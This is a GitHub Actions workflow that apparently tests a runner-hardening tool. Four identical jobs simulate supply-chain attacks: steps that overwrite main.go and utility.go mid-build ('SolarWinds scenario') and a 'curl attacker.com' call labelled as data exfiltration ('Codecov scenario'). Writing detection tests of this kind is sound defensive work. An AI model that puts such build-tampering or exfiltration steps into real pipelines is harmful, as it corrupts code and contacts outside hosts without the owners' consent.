name: Ashishkurmi Sample Workflow
on:
  workflow_dispatch:
jobs:
  build:
    name: build
    runs-on: ubuntu-latest
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: HardenRunner
        uses: ashishkurmi/harden-runner@main
        with:
          egress-policy: audit
      - run: sleep 30
      - name: Code Checkout
        uses: actions/checkout@v2
        with:
          fetch-depth: 2

      # SolarWinds Scenario: Overwrite main.go and utility.go
      - name: File Overwrite with mv
        run: |
          code='package main\n\nfunc main(){\nprintln("code added")\n}'
          printf "$code" > main1.go
          mv main1.go main.go
      - name: File Overwrite with echo
        run: echo "//overwritten" > utility.go

      # Codecov Scenario: Exfiltrate data to a malicious endpoint
      - name: Data Exfiltration To Attacker Controller Endpoint
        run: "curl attacker.com  --connect-timeout 5  || true"

      - name: 1 Docker Action ashishkurmi/hello-action
        uses: ashishkurmi/hello-action@main
        env:
          SLEEPINSECONDS: 5
  build1:
    name: build1
    runs-on: ubuntu-latest
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: HardenRunner
        uses: ashishkurmi/harden-runner@main
        with:
          egress-policy: audit
      - run: sleep 30
      - name: Code Checkout
        uses: actions/checkout@v2
        with:
          fetch-depth: 2

      # SolarWinds Scenario: Overwrite main.go and utility.go
      - name: File Overwrite with mv
        run: |
          code='package main\n\nfunc main(){\nprintln("code added")\n}'
          printf "$code" > main1.go
          mv main1.go main.go
      - name: File Overwrite with echo
        run: echo "//overwritten" > utility.go

      # Codecov Scenario: Exfiltrate data to a malicious endpoint
      - name: Data Exfiltration To Attacker Controller Endpoint
        run: "curl attacker.com  --connect-timeout 5  || true"

      - name: 1 Docker Action ashishkurmi/hello-action
        uses: ashishkurmi/hello-action@main
        env:
          SLEEPINSECONDS: 5
  build2:
    name: build2
    runs-on: ubuntu-latest
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: HardenRunner
        uses: ashishkurmi/harden-runner@main
        with:
          egress-policy: audit
      - run: sleep 30
      - name: Code Checkout
        uses: actions/checkout@v2
        with:
          fetch-depth: 2

      # SolarWinds Scenario: Overwrite main.go and utility.go
      - name: File Overwrite with mv
        run: |
          code='package main\n\nfunc main(){\nprintln("code added")\n}'
          printf "$code" > main1.go
          mv main1.go main.go
      - name: File Overwrite with echo
        run: echo "//overwritten" > utility.go

      # Codecov Scenario: Exfiltrate data to a malicious endpoint
      - name: Data Exfiltration To Attacker Controller Endpoint
        run: "curl attacker.com  --connect-timeout 5  || true"

      - name: 1 Docker Action ashishkurmi/hello-action
        uses: ashishkurmi/hello-action@main
        env:
          SLEEPINSECONDS: 5
  build4:
    name: build4
    runs-on: ubuntu-latest
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: HardenRunner
        uses: ashishkurmi/harden-runner@main
        with:
          egress-policy: audit
      - run: sleep 30
      - name: Code Checkout
        uses: actions/checkout@v2
        with:
          fetch-depth: 2

      # SolarWinds Scenario: Overwrite main.go and utility.go
      - name: File Overwrite with mv
        run: |
          code='package main\n\nfunc main(){\nprintln("code added")\n}'
          printf "$code" > main1.go
          mv main1.go main.go
      - name: File Overwrite with echo
        run: echo "//overwritten" > utility.go

      # Codecov Scenario: Exfiltrate data to a malicious endpoint
      - name: Data Exfiltration To Attacker Controller Endpoint
        run: "curl attacker.com  --connect-timeout 5  || true"

      - name: 1 Docker Action ashishkurmi/hello-action
        uses: ashishkurmi/hello-action@main
        env:
          SLEEPINSECONDS: 5




